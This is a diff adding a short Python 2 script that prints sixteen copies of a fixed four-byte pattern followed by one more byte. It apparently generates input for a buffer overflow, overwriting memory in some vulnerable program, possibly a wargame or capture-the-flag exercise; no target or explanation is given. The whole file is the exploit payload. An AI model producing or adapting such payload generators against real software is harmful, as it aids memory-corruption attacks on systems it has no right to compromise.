@@ -1,0 +1,10 @@
+#!/usr/bin/env python
+
+arg = ""
+for i in range(0,16):
+  arg += "\xba\xdf\xdf\x9f"
+
+arg += "\xa8"
+
+print arg
+
